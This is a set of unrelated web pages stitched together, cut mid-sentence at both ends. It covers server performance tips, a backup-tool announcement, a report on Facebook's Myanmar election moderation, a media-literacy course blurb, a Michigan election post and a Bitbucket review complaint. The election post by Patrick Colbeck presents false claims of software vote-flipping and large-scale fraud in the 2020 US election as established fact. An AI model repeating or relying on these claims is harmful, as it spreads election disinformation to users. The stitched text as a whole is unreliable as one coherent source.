Of course there's a tradeoff between the cost of cloud infrastructure and the cost of paying developers to optimize; but paying developers to set up app clusters and database replication costs money too, and has fewer of the benefits and cost savings.
</p>
<h3>Modern computers are mind-numbingly fast</h3>

<p>
Writing the game engine in C++ for <a href="https://store.steampowered.com/app/1090060/Weapon_Hacker/" target="_blank">Weapon Hacker</a>, a side project of mine, taught me a lot about how powerful modern hardware really is. 
</p>
<p>
Coming from a C# / Python / Javascript / JIT-compiled world, my early experiments putting graphics on the screen in native C++ and DirectX were startling; the compiled executable was tiny, started up instantly, and could put hundreds of thousands of objects on the screen at 60 frames per second without breaking a sweat. 
</p>
<p>
A 60 FPS target gives games about 16ms to do all the work they need to in a frame. Weapon Hacker doesn't even compare to what modern AAA engines do, but it generates its random worlds in about 15ms (which last for about an hour-long playthru), and it handles frames with thousands of particles, physics objects, textures, font glyphs and graphical primitives, as well as sound mixing and music streaming, in about 5ms on a 2010-era CPU.
</p>
<p>
Compared to a game engine, the job of most web apps is incredibly mundane: take a request (some HTTP text) and return a response (some HTML or JSON or some such). And yet, 100ms or 500ms request processing times are common. Sometimes the info returned is expensive to generate, but it pays not to forget that in the end it's just inputting some bytes and outputting some bytes. 
</p>
<p>
Given the relative simplicity of the task, 16ms of processing per request (after subtracting network latency) should be achievable in most web applications.
</p>
<p>
On a cheap $5/month dual-core cloud VM, that would allow about 7,500 requests per minute. Or 7,500 pageviews, if you offload static stuff to a CDN. That means 10.8M per day, or 324M pageviews per month. 
</p>
<p>
Of course traffic wouldn't be evenly spread throughout the day, and cloud computing is generally priced for burst loads. But, let's be honest - your traffic isn't anywhere near 324M pageviews, right?
</p>
<p>
If not, condolences that Notepadly.io isn't a market behemoth yet - but congratulations, you can divert some time from multi-master replication and spot instance auto-scaling, and add a cool Clippy virtual assistant instead. Your users will thank you for it.
</p>
<h3>Optimization basics</h3>

<p>
Server-side optimization is a big topic, and there are likely people much better at it (and at explaining it) than I am, so here are just a few general pointers.
</p>
<p>
First - measure.
</p>
<p>
This can be as simple as putting timers around sections of code to see how many milliseconds they take to execute. Or, look at TTFB (time to first byte) in the Network tab of your browser's dev tools. 
</p>
<p>
2ms and 200ms requests seem similar to human perception, despite a massive 100x time difference, so it pays to have hard data.
</p>
<p>
Run simple stress tests to see how much traffic your app can handle. A simple one-page python script on a nearby VM or a dev machine can easily spin up a bunch of threads to make requests as fast as possible. Count the number of completed requests in, say, 30 seconds and watch your server's CPU, memory and IO usage to see where they max out.
</p>
<p>
Compare your stress test results to your day-to-day traffic, and aim for enough headroom that a normal day's traffic peaks at ~1% capacity (or whatever makes sense for your business).
</p>
<p>
Once you have some baseline measurements, here are a few common performance improvements:
</p>
<ul>
<li>Cache infrequently-changing responses in server memory</li>
<li>Optimize your database queries - add a well-chosen index, or delete an unneeded one (indices are separate internal tables, so you can sometimes save a lot of storage space and I/O time by removing one); tweak your WHERE conditions to narrow down the rows the DB has to scan through internally</li>
<li>Reduce the number of HTTP requests; don't let REST purists tell you you need a separate URL for each entity - if your app always needs customer &amp; order data at the same time, make it a single API call</li>
<li>Let clients cache static files indefinitely; use cache-breakers on the URLs for content changes</li>
<li>Offload static files to a CDN</li>
<li>Make sure your web server and database are set up and tuned right - that they have enough memory, threads, etc.</li>
<li>Consider a fast single-file database like <a href="https://sqlite.org/whentouse.html" target="_blank">SQLite</a>; it's not for every application, but I've found it handles individual queries about 5x faster than the big client-server DBMS's, with about 1/5 the storage space, and with much less administrative complexity. With its performance numbers it can actually power large sites. It also supports sharding scenarios (e.g. a database file per customer) which can get around the write-concurrency limitations for some applications.</li>
<li>Learn about code performance - in particular the dominance of memory latency as a slowdown factor, and the high price of I/O. Chandler Carruth has <a href="https://www.youtube.com/watch?v=fHNmRkzxHWs" target="<em>blank">a great talk</a> on these from a C++ perspective. And Mike Acton's <a href="https://www.youtube.com/watch?v=rX0ItVEVjHc" target="</em>blank">talk on data-oriented design</a> is a classic.</li>

</ul>
<h3>You can upgrade your VM in a pinch</h3>

<p>
Cloud hosts usually let you upgrade to a higher-powered VM pretty easily in the event of some viral flood of traffic; in AWS, on my clients' projects, we have been able to launch more powerful EC2 instances (and vise-versa, consolidate to smaller, cheaper instances) by cloning to an AMI image, launching a new instance, and rerouting the same elastic IP, in about 5 minutes. If you freeze data changes, you can even stay online during the transition.
</p>
<p>
That could buy you time to think about clustering if you reach the scale where you need it.
</p>
<h3>In summary</h3>

<p>
There's a time and a scale for big distributed computing setups. But modern CPUs and cloud VMs are insanely fast, and the job of most web apps is incredibly mundane - you can get very far with some basic optimizations, and will likely do the world, your developers and your users some favors in the process.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>You know backups right? Those things you never got around to setting up… well no need to feel guilty any longer, today
I’m excited to share my new backup tool - <a href="https://bupstash.io/">Bupstash</a>!</p>
<p>So why is bupstash cool? Bupstash lets you make encrypted, deduplicated and secure backups.
Bupstash is fast, focused, and places strong emphasis on both security and privacy. Backups can happen to local drives or over ssh. Bupstash can backup files, directories, and even arbitrary command output.</p>
<p>Bupstash was designed to have:</p>
<ul>
<li>
<p>Efficient deduplication - Bupstash can store hundreds of encrypted directory snapshots using a fraction of the space encrypted tarballs would require.</p>
</li>
<li>
<p>Offline decryption keys - Backups do not require the decryption key be anywhere near an at-risk server or computer.</p>
</li>
<li>
<p>Key/value tagging with search - all while keeping the tags fully encrypted.</p>
</li>
<li>
<p>Great performance on slow networks - Bupstash really strives to work well on high latency networks like cellular and connections to far-off lands.</p>
</li>
<li>
<p>Secure access controls - Ransomware and disgruntled business partners will be powerless to delete your backups, even after a
full system take over.</p>
</li>
<li>
<p>Efficient incremental backups - Bupstash knows what it backed up last time and skips that work.</p>
</li>
</ul>
<p>Sounds great right? How does it work?</p>

<p>Bupstash stores data as a kind of <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> with encrypted root nodes. Each
time a file is saved, it is split into data chunks, which are
encrypted (using crypto_box_curve25519xchacha20poly1305 from <a href="https://github.com/jedisct1/libsodium">libsodium</a>) and then sent to or saved in the backup repository if they have never been seen before.</p>
<p>To identify encrypted chunks for deduplication, we use an <a href="https://en.wikipedia.org/wiki/HMAC">HMAC</a> of the decrypted contents. The HMAC
key is a shared secret between the encryption key and the decryption key. This means
someone cannot guess a chunk’s contents based on the deduplication address in the backup
repository.</p>
<p>The end result is that many snapshots which share similar data also share encrypted chunks, resulting in very space-efficient backups. My personal backup repository
contains over 400 snapshots of my 40 GB home directory and weighs in at around 50 GB total.</p>

<p>In bupstash a key is either a ‘main key’ or a ‘put key’. Backups made by put keys can only be decrypted by the original
main key. With this setup, you can send backups to a bupstash repository without ever risking your decryption key.</p>
<p>You can imagine Bupstash’s model like when you send someone a <a href="https://en.wikipedia.org/wiki/GNU_Privacy_Guard">GPG</a>-encrypted email and you do not have access to their decryption key. Instead you use asymmetric cryptography and send data addressed
to their private key. Another benefit of the email-like model is that the email provider does not need access to your
decryption keys to store or forward your emails. Likewise, a remote bupstash repository never needs access
to your backup decryption keys to operate.</p>

<p>Bupstash maintains all backups in a mostly append-only log of encrypted backup metadata.
In order to allow searching that metadata, bupstash syncs the metadata log client-side before
performing decryption and searches client-side. This design sacrifices some performance for search and
listing in favour of fully encrypted metadata. In practice bupstash can easily search hundreds to thousands of snapshots
in seconds.</p>

<p>Bupstash focuses on backup and restore streaming, avoiding network round trips as much as possible.</p>
<p>When a user requests an encrypted snapshot, the
server walks the entire data structure server-side, and pushes
it to the client. The client then is able to verify the structure
and restore your data without any network round trips.</p>
<p>The bupstash <a href="https://bupstash.io/doc/man/bupstash-gc.html">‘garbage collector’</a> works
entirely server-side and without requiring the server to decrypt any data, avoiding
sending data to the client in costly and slow ways.</p>
<p>What does this all mean? In some benchmarks restoring backups from a distant
remote server, I was able to achieve 6x performance improvements over the
previous backup tool I was using (benchmarks coming soon).</p>

<p>Bupstash is designed to allow the use of ssh force commands to control whether
an ssh key has permission to make new backups, list backups or remove backups.</p>
<p>In my personal backup setup, my laptop can only add new backups via a vpn, but never remove
old backups from my backup repository. If my laptop were to be stolen, all backups are
safe from deletion.</p>
<p>When bupstash is configured with append-only access controls, making a backup is analagous to sending someone an email,
the recipient of the message is the one who decides when the message can be deleted.</p>
<p>You can see how to set this up in the <a href="https://bupstash.io/doc/guides/Remote%20Access%20Controls.html">access controls tutorial</a>.</p>

<p>Bupstash has the notion of a ‘send log’ for saving bandwidth and accelerating snapshot
speeds. Bupstash remembers which data chunks were
sent in the previous snapshot, allowing the client to avoid resending data pointlessly.</p>

<p>Below is a simple bupstash session:</p>
<pre><code>$ export BUPSTASH_REPOSITORY=ssh://bupstash.io/backups

$ bupstash put host="$(hostname)" name=home-backup.tar /home
ebb66f3baa5d432e9f9a28934888a23d

$ bupstash list host=$(hostname) and 'name=*.tar'
...
id="dbca49b072c0f94b9e72bf81e7716ff9" name="home-backup.tar" hostname="server1" timestamp="2020/08/03 15:47:32"

$ bupstash list-contents id="dbca*"
drwxr-xr-x 0     2020/10/30 13:32:04 .
-rw-r--r-- 1967  2020/10/30 13:32:04 data.txt
...

$ bupstash get id="dbca*" | tar -C ./restore -xvf -
...
$ bupstash get --pick data.txt id="dbca*"
data!

$ bupstash rm name=home-backup.tar and older-than 30d
$ bupstash gc

</code></pre><p>My goal with the bupstash user interface is letting people get on with their day
while having a simple and excellent backup insurance policy.</p>

<p>Bupstash is currently in alpha and ready for people to play with at their own
risk.</p>

<p>Wearing a plastic face shield and his orange monastic robes, Ashin Wirathu walked into a Yangon police station on November 2 after more than a year on the run. Until he went into hiding in June of last year, Wirathu, a nationalist preacher with links to the Tatmadaw — the Burmese military — was <a href="https://www.theguardian.com/global-development/2017/may/12/only-takes-one-terrorist-buddhist-monk-reviles-myanmar-muslims-rohingya-refugees-ashin-wirathu">one of Myanmar’s most prominent Islamophobes</a>, spreading bigotry and disinformation online. In May 2019, he was <a href="https://www.mmtimes.com/news/warrant-issued-arrest-ultranationalist-monk.html">charged with sedition</a>, but he <a href="https://myanmar-now.org/en/news/wirathu-declared-a-fugitive-after-failing-to-appear-at-court">never showed up</a> for his court date.</p>



<p>Wirathu’s surrender came in the final stages of an election campaign that once again exposed Myanmar’s racial and religious tensions, three years after a surge in hate speech and nationalist sentiment drove a campaign of ethnic cleansing targeting the country’s Muslim Rohingya minority.&nbsp;</p>



<p>The monk’s act was a piece of theater designed to put him and his anti-Muslim ideology back in the public eye and feed into the rumors and misinformation that was circulating online. Activists braced for a surge in hate speech on social media. It never came. The hard news of his arrest was covered by the mainstream press, but online, his supporters were strangely muted. Facebook pages sharing his views were flagged by civil society groups and quickly shut down by the platform.</p>



<p>“He didn’t get anything like the megaphone that he had hoped to get,” says Victoire Rio, a Yangon-based researcher and advisor to the Myanmar Tech Accountability Network, a consortium of nonprofit groups working on disinformation and hate speech. “The whole thing got fairly well contained, and that’s in big part because Facebook was able to take action.”</p>



	




<p>Facebook has faced years of criticism for its failings in Myanmar. In 2018, the <a href="https://uk.reuters.com/article/us-myanmar-rohingya-facebook/u-n-investigators-cite-facebook-role-in-myanmar-crisis-idUKKCN1GO2PN">United Nations alleged the platform</a>&nbsp;allowed the proliferation of hate speech that incited the genocide. Campaigners in the U.S. and in Myanmar had been pressuring the company to prepare for the 2020 elections to prevent further violence.</p>



<p>In response, Facebook began trialing a <a href="https://about.fb.com/news/2020/08/preparing-for-myanmars-2020-election/">new, more active approach</a> to dealing with hate speech and political disinformation in the run up to the vote on November 8. It involved limiting users’ ability to reshare old pictures without context — a common misinformation tactic — and working with local partners to verify political parties’ pages and fact-check stories.&nbsp;</p>



<p>Most significantly, the “community standards” Facebook uses to police content on its platforms were expanded. Usually, the company does not remove misinformation unless it creates a threat of imminent harm, but for a few months in Myanmar, that policy was broadened to include anything that could “suppress the vote or damage the integrity of the electoral process” — for example, a baseless rumor that the country’s de facto leader, Aung San Suu Kyi, had died from Covid-19, which circulated before the election. Normally, the company’s community standards defines “hate speech” narrowly as attacks on people not concepts — Muslims, but not Islam. That was changed to prevent users from targeting the religion itself or attacking “invaders” or “illegals,” derogatory terms that refer to the Rohingya.</p>



	




<p>It is the first time the company has created country-specific community standards.</p>



<p>“That was a huge deal,” Rio says. “A lot of the problematic content is not framed as hate speech or as a call to violence in the way that Facebook likes it to be, like <em>Cluedo</em> — the weapon, the victim, the location, the whole thing.”</p>



<p>Myanmar has a well-documented problem with online hate speech and malicious falsehoods, which often attack the country’s Muslims. Nationalists and ultra-conservative Buddhists have successfully portrayed Muslims as a threat to the country’s culture and majority religion and as foreign interlopers. This hostility is so widespread that in the 2020 election, mainstream political parties competed to portray their opponents as more sympathetic to Islam.</p>



<p>One widely shared claim, originating from a candidate for the military-backed Union Solidarity and Development Party, was that <a href="https://www.myanmar-now.org/en/news/nld-to-report-usdp-candidate-for-making-false-claims-about-muslims-in-the-ruling-party?page=2">Suu Kyi’s National League for Democracy (NLD) had 42 Muslim candidates</a>. The true number was two. An image circulated on social media showing an NLD meeting in which Buddhist monks appeared to be sitting on the floor while Muslim attendees sat on chairs, which, presented without context, looked like a calculated insult. Normally, such falsehoods would not have breached Facebook’s community standards.&nbsp;</p>

<p>In October and November, disinformation that tried to exploit religious differences to distort the election result was taken down by Facebook, as were fake “leaked documents” feeding conspiracy theories linking Suu Kyi to the financier and human rights activist George Soros and unfounded claims by the opposition that the vote was rigged.</p>



<p>Several of Facebook’s “trusted partners,” civil society organizations that the company gives a kind of express lane for reporting violations of community standards, told <em>Rest of World</em> that in October and November, when they reported falsehoods and hate speech, their complaints were quickly escalated and the flagged content was removed. Previously, they found that their interventions carried little weight.</p>



<p>“To their credit, [Facebook has] thrown in much more effort, many more resources, for this election than we’ve seen them do … in the last few years,” says Jes Kaliebe Petersen, CEO of Phandeeyar, a social-technology accelerator in Yangon. “That’s been very positive. They’ve had boots on the ground; they’ve had people from their Singapore team dedicated to this. They’ve engaged with civil society.”</p>



<p>In October, Facebook <a href="https://uk.reuters.com/article/uk-facebook-myanmar/facebook-shuts-dozens-of-myanmar-pages-over-inauthentic-behaviour-idUKKBN27M1BC">removed dozens of accounts</a> for “coordinated inauthentic behavior,” its term for spreading disinformation, and dismantled networks of fake users and clickbait pages that were pushing political misinformation. (Data for Facebook’s takedowns in November is not yet available.) Activists told <em>Rest of World</em> that the approach led to a significant reduction in disinformation and hate speech compared to the previous election five years ago.</p>



<p>“I’m not saying there is no hate speech in 2020, but I think it’s much less than in 2015,” says Harry Myo Lin, an interfaith activist. “They have a more active response to reports and hateful content. It’s not perfect, but I think they did better than before.”</p>



<p>A side effect of Facebook’s crackdowns on hate speech some actors migrated to other platforms, including the Russian social network VK and YouTube — exposing the latter’s own deficiencies in dealing with malicious content. “YouTube, now, is the most problematic one,” says Myat Thu, founder of the Yangon-based fact-checking site Think Before You Trust.&nbsp;</p>



<p>Google-owned YouTube did not respond to a request for comment.</p>



<p>With the vote now over — the incumbent NLD won in a decisive victory — Facebook is set to return to its pre-election policies on December 6, leaving activists concerned that the platform will revert to being a place where hate and disinformation continues to circulate.</p>



<p>“The big question is: What happens next?” Petersen says. “Is this a sign of a new level of consistent support and focus from Facebook, or is it like a SWAT team that they put in, and now … the SWAT team is going to leave again, and we’re back to where we were before.”</p>



<p>In a statement, Facebook said it considers the experiment a success and could adapt it for other countries in the future.</p>



<p>At the Myanmar Tech Accountability Network, Rio said that while Facebook’s experimental approach still had profound flaws, it demonstrated that the company does have the tools to deal with the corrosive misinformation and bigotry that have proliferated on the platform worldwide.</p>



<p>“We need to give them credit where it’s due. They did pretty well,” Rio says. “But if anything, it shows that when they want to, they can.”</p>

<p><em><strong>A course for children in Grades 8-10.</strong></em></p>

<p>The information age is quickly turning into a misinformation age as we are increasingly being manipulated and lied to, by everyone. Our leaders, our media, the companies trying to sell us things, the companies wanting to collect our data, and even the companies claiming to expose the lies of other companies are manipulating us. In fact, even our friends and family inadvertently end up doing the same when they send us 'forwards' without critically analyzing them for accuracy.</p>
<p>One of the most important skills to learn is the ability to spot these lies and protect ourselves from being manipulated. This course will use practical examples and case-studies to analyze how and why the manipulation occurs, how and why most targets fall for these tricks, and how to spot, analyze and disarm them.</p>

<p>We will look at two broad problems: outright lies ("fake news") and technically true statements that are created to mislead. For lies, we will analyze how to spot lies, why even easy-to-disprove lies are widely believed, and how to prevent ourselves from falling for such lies. In case of misleading truths, we will see ways in which numbers and statistics can mislead (for example, use of absolute values instead of percentages or vice versa, or use of mean instead of Median or vice versa), ways in which text/stories/graphics can mislead (for example, in advertisements), and common sense ways in which to estimate the accuracy of the statements (for example, through basic web searches for information, looking for connections and relationships, making approximations and ballpark estimates).</p>

<p>After this course, students would be better equipped to defend themselves against the dark arts of social media manipulation.</p></div><div title="navin kabra photo.png" data-is-responsive="false" data-display-mode="fill" data-content-padding-horizontal="0" data-content-padding-vertical="0" data-exact-height="202" id="comp-kaphhov4"><a href="https://www.genwise.in/our-instructors/Navin-Kabra" target="_self" id="comp-kaphhov4link"><wix-image data-has-bg-scroll-effect="" data-image-info="{&quot;imageData&quot;:{&quot;type&quot;:&quot;Image&quot;,&quot;id&quot;:&quot;comp-kaphhov4_runtime_dataItem-kaphhp6n&quot;,&quot;metaData&quot;:{&quot;pageId&quot;:&quot;bcpzw&quot;,&quot;isPreset&quot;:false,&quot;schemaVersion&quot;:&quot;2.0&quot;,&quot;isHidden&quot;:false},&quot;title&quot;:&quot;navin kabra photo.png&quot;,&quot;uri&quot;:&quot;98f7cd_c1146be150aa40dc91e5feafc400ffb6~mv2.png&quot;,&quot;description&quot;:&quot;&quot;,&quot;width&quot;:1123,&quot;height&quot;:1312,&quot;alt&quot;:&quot;Navin Kabra&quot;,&quot;name&quot;:&quot;navin kabra photo.png&quot;,&quot;crop&quot;:null,&quot;link&quot;:{&quot;type&quot;:&quot;DynamicPageLink&quot;,&quot;innerRoute&quot;:&quot;Navin-Kabra&quot;,&quot;routerId&quot;:&quot;routers-k1j3n23p&quot;,&quot;id&quot;:&quot;comp-kaphhov4_runtime_dataItem-kaphhp6nlink&quot;},&quot;displayMode&quot;:&quot;fill&quot;},&quot;containerId&quot;:&quot;comp-kaphhov4&quot;,&quot;displayMode&quot;:&quot;fill&quot;}" data-has-ssr-src="true" data-is-svg="false" data-is-svg-mask="false" id="comp-kaphhov4img"><img id="comp-kaphhov4imgimage" alt="Navin Kabra" data-type="image" itemprop="image" src="https://static.wixstatic.com/media/98f7cd_c1146be150aa40dc91e5feafc400ffb6~mv2.png/v1/fill/w_168,h_196,al_c,usm_0.66_1.00_0.01,blur_3/navin%20kabra%20photo.png"></wix-image></a></div><p><span><span><span>Navin Kabra is CTO and Co-Founder at ReliScore, a company that provides skill and capability assessment solutions to the software industry.

<p>By Patrick Colbeck</p>



<p>I’m not sure how you have spent your day today, but I spent mine reviewing contracts and system overview documents related to voting systems.  Why is that?  You may have heard about the <a href="https://thepostmillennial.com/software-glitch-caused-6-000-republican-votes-to-swing-democrat-in-michigan-county">6,000 votes in Antrim County</a>, Michigan that were flipped via software from Donald Trump to Joe Biden. No one denies the veracity of this claim.  The only differences between various parties involved revolve around explanations for exactly how that happened.  </p>



<p>The media has already projected that Michigan’s 16 Electoral College votes will go to Joe Biden.  This projection is based upon an assertion that Joe Biden leads Donald Trump by 146,123 votes.  Any attempt to assert that Michigan is “in play” would have to account for that large of a deficit.  As it turns out, we can.  Against the backdrop of the 6,000 vote “flip” in Antrim County, we have also identified evidence of algorithmic data manipulation in three other counties that could account for as many as 140,000 votes being switched from Donald Trump to Joe Biden in Michigan…and that is through examination of only 3 out of the 83 counties in Michigan.  In the wake of election fraud allegations, <a href="https://www.mlive.com/politics/2020/11/federal-lawsuit-seeks-to-throw-out-12m-votes-flipping-michigan-for-trump.html?fbclid=IwAR2H1saVwouRyRpAnhkWghxhOPhfODvEjDJA8uz9fLVe4OGl9Sdlt1JsES0">a Federal Lawsuit has been filed that addresses 1.2 Million ballots cast in Michigan</a>.  The bottom line is that the election fraud observed to date can indeed impact the election results in Michigan and potentially the nation as a whole.</p>



<p>Key findings:</p>



<div><div>
<ul><li>Dominion Voting Systems are designed to connect to the internet including wireless internet connections which could be accessed outside of a vote counting facility. Introduces significant chain of custody concerns regarding vote tallies.</li><li>My personal attempts to discern the chain of custody regarding how vote tallies were to be transferred from the counting board tabulation machines to the county were met with deflection and avoidance by one of the Senior election officials, Chris Thomas.</li><li>According to Dominion, there are two methods available to users of the Dominion Voting system to transfer vote tally data to election officials: 1) physical transfer via flash drive or 2) over a network connection.  </li><li>The inability to verify which method is used obstructs the statutory duties of a poll challenger and puts election integrity at risk.</li><li>According to the Detroit Elections Manual, flash drives were to be used to transfer the data, but it was obvious from review of the network configuration that network connections were in use including Wi-Fi connections.  </li><li>If memory cards were indeed intended to be used, it would have raised additional chain of custody concerns regarding these cards.  In Philadelphia, <a href="https://philadelphia.cbslocal.com/2020/09/30/laptop-encrypted-usb-drives-stolen-from-philadelphia-election-machine-warehouse-officials/">an election laptop and encrypted flash drives were stolen from an election machine warehouse in September</a>.</li><li>A forensic audit of the voting system configuration in Antrim County revealed that an open port had been accessed in the Dominion voting machines putting chain of custody at risk.</li><li>If a computer is connected to the internet, all resources on that computer, including voting data, is vulnerable to remote manipulation.  See my <a href="https://letsfixstuff.org/2020/08/lets-fix-election-integrity-ev/">Election Integrity Solution Podcast</a> for more information on this risk.</li></ul>

<p>Why is internet connectivity a big deal?  It enables top-down manipulation of vote tallies.  </p>



<p>Some of you may have seen examples of “vote flipping” on live news network feeds in which thousands of votes were added to Joe Biden while the exact number of votes were subtracted from Donald Trump.  </p>



<p><a href="https://rumble.com/vb236n-proof-why-trump-will-win-part-2.html">SEE VIDEO PROOF OF VOTE FLIPPING</a></p>



<p>Remember, these “flips” have already been confirmed to have happened in Antrim County.  </p>



<p>At the end of the night, though, any electronic vote switching must be reconciled with other ballot records such as the poll books and physical ballot counts.  All precincts must be balanced to ensure the integrity of that precincts vote tally.</p>



<p>Many of you may recall news stories of a cessation of voting activities across many of the major cities in battleground states between Midnight and 4:00am on November 4.  <a href="https://www.politifact.com/factchecks/2020/nov/04/facebook-posts/battleground-states-did-not-stop-counting-votes-el/">According to Politifacts this assertion is FALSE</a>.  </p>



<blockquote><p>“At no point has the counting process stopped since it began at 7 a.m. yesterday morning, which was when, per Michigan election law, it could begin,” said Tracy Wimmer, director of media relations for Michigan Secretary of State Jocelyn Benson, referring to the morning of Nov. 3.</p><cite>SOURCE:  <a href="https://www.politifact.com/factchecks/2020/nov/04/facebook-posts/battleground-states-did-not-stop-counting-votes-el/">Politifact</a></cite></blockquote>



<p>I was on the floor of the AV Counting Board in Detroit between midnight and 4:00am.  Counting activity had indeed stopped during that time period.  In fact, the only apparent ballots available to count at that time were around 12 boxes of military ballots.  Rather than count these ballots during overnight quiet period, Detroit Election Officials chose to wait until they had prohibited access to the AV Counting Board by Poll Challengers such as myself.  I had left to train our next wave of poll challengers in a break room upstairs only to find that my re-entry to the counting board was prohibited. </p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-1024x576.jpg" alt="" srcset="https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-1024x576.jpg 1024w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-300x169.jpg 300w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-768x432.jpg 768w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-1536x864.jpg 1536w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>SOURCE:  Cardboard on Windows at Detroit AV Counting Board by Patrick Colbeck</figcaption></figure></div>



<p>So, why would the ballot count be stopped if there were ballots remaining to be counted?  The end of shift for the poll workers on duty was 5:00am.  Well, one could make the claim that they were waiting for word on the number of votes they needed to win the state.  Perhaps coincidentally, a Detroit Elections Bureau vehicle arrived at the back entrance of the AV Counting Board with 61 mail bins full of ballots at 3:45 am.  I witnessed ballot after ballot being placed upon staging tables after a very quiet night.  Could it be that this was an attempt to ensure that the paper trail matched with the electronic vote tally?</p>



<p>Is it even possible to modify the electronic vote tally?  According to <a href="https://www.thegatewaypundit.com/2020/11/dominion-voting-systems-officer-strategy-security-eric-coomer-admitted-2016-vendors-election-officials-access-manipulate-vote/">Dominion Voting Systems Officer of Strategy and Security, the answer is yes.</a></p>



<blockquote><p><strong>Dr. Coomer’s statement brings to light a very serious issue all voters should understand.</strong>&nbsp;Voting systems must be re-certified each time they make changes to the hardware or software. Recertification is an expensive and time consuming process.&nbsp;<strong>What Dr. Coomer told the Board is that Dominion Voting does not go back for recertification of software when threats to their code are discovered.&nbsp;</strong>Rather, they rely on post-election audits and providing advice to election jurisdictions about security. I have reviewed all of the recertification documents produced by Dominion, and I do not recall any software adjustments for security purposes.</p><p><strong>This is the reality of the security of your vote.</strong>&nbsp;Software systems that count and record the vote across Illinois and throughout the USA are not updated to address security problems, and even if they were, the software can be completely bypassed by going to the data tables that drive the systems.</p><cite>SOURCE:  <a href="https://www.thegatewaypundit.com/2020/11/dominion-voting-systems-officer-strategy-security-eric-coomer-admitted-2016-vendors-election-officials-access-manipulate-vote/">The Gateway Pundit</a></cite></blockquote>



<p>So, if vote tallies were electronically manipulated, what records need to be preserved to verify that it happened?  In order to answer that question, let’s take a closer look at the design of the Dominion Voting System.</p>

<p>Upon review of the design of the Dominion Voting System, what components merit further examination?</p>



<p>While ALL equipment and records need to be secured as soon as possible, I believe the security of our election boils down to the secure retention and examination of the following key artifacts:</p>



<ul><li>ImageCast Listener Module: “The ImageCast Listener module is responsible for receiving and tracking encrypted results file transmissions from any ImageCast Election Day tabulator.”</li><li>Image Cast Evolution Memory Card: “The ICE memory card has only one partition that holds the ballot images, election database, audio files, etc” (<em>Very curious as to what “etc” might entail</em>)</li><li>EMS Audit Log:  “From the initial state of the election project, until the deactivation state, the EMS system maintains an activity log within the EMS Database. This activity log contains every action that any of the users have performed within the system and represents a detailed audit log that can be analyzed and printed in the form of an audit report. The audit record information cannot be modified or permanently deleted using the EMS client applications. It can, however, be exported for archiving purposes as part of the record retention policy. Keeping in mind that audit log information can contain a significant amount of information, it is the responsibility of the administrative user to perform regular archiving of the log.  During the voting phase of the election event, ImageCast devices also keep an activity audit log which tracks events happening on the device itself.”</li><li>Event logs from the Election Official, Electronic Poll Book, Tabulator and Adjudicator computers</li></ul>



<p>There are <a href="https://letsfixstuff.org/2020/11/michigan-election-fraud-is-real-and-significant/">numerous lawsuits</a> in progress through the state and federal court systems which allege election fraud.  It will take time to gather and evaluate all of the artifacts cited above.  The Dominion Voting System is complex.  This complexity is compounded by vote tally chain of custody concerns enabled by the connection of this system to the internet.  It will take weeks, even months potentially, to reveal the truth of what caused software “glitches” such as the Antrim County vote flip and other “flips” observed throughout the early morning hours of November 4th.</p>



<p><em>NOTE:  <a href="https://uscode.house.gov/view.xhtml?req=granuleid:USC-prelim-title52-section20701&amp;num=0&amp;edition=prelim">52 USC Section 20701</a> requires that election records are retained for 22 months from the date of the election.  Furthermore, willful destruction of these records would likely be seen by courts as justification for issuing orders to redo the election.</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I consider PR reviews as one of the fundamental and most important
tools developers have to collaborate. We use it daily to submit changes and
to get important feedback from peers and more experienced developers.</p>
<p>And so, <strong>it should be targeted to software developers and not to managers</strong>.</p>
<p>Let’s cover some of the daily tortures of dealing with <a href="https://bitbucket.org/">Bitbucket</a>, which
I unfortunately need to deal with.</p>

<blockquote>
<p>Hey friend, how about you implement this piece of functionality in this other way?</p>
</blockquote>
<p>This common and healthy workflow is <strong>fundamentally broken</strong> in BB because
you cannot copy code from the body of the PR into a comment without getting
a lot more than what you clearly selected.</p>
<p><img src="https://nosleepjavascript.com/460408cff29803e91776376bae5605ad/copypastev3.gif" alt="Copying and pasting code from PR changes is broken"></p>

<p>Trying to click anywhere else when writing a comment like for example
expanding to see more code will result in an alert that states
that your comment changes will be removed which is already super annoying.
But if you even do not care about discarding your comment and you go ahead
and click on discard the comment isn’t really discarded! So it is completely misleading.</p>
<p>This is BB not caring about the amount of time developers throw into detailed
code reviews.</p>
<p><img src="https://nosleepjavascript.com/7a16dbe4130224ea56472f85903a24f7/commentclick.gif" alt="Are you sure you want to discard (actually not) your comments?"></p>
<h2 id="what-you-see-may-be-what-you-get-horrible-markdown-support"><a href="#what-you-see-may-be-what-you-get-horrible-markdown-support" aria-label="what you see may be what you get horrible markdown support permalink"></a>What You See May Be What You Get: horrible markdown support</h2>
<p>Markdown is a tool aimed for technical folks, it is minimal but gets
the job done without any distractions, it is <em>not</em> <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> (what you see is what you get)
by design and partially for simplicity.</p>
<p>BB takes the worse of all worlds: horrible “standard” markdown support
that varies across places and combine it with a <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> editor.
This creates really weird
use cases we will cover below.</p>
<p>Other technical tools, such as <a href="https://github.com/">Github</a>, understand how important decent markdown
support is and they use it to empower developers.
They do build visual tools on top of markdown but without combining them
into a monster broken implementation.</p>
<p>Let’s see some specially frustrating cases</p>
<h3 id="selecting-a-code-block-language"><a href="#selecting-a-code-block-language" aria-label="selecting a code block language permalink"></a>Selecting a code block language</h3>
<p>Instead of using the standard <strong>”```typescript”</strong> they include a visual
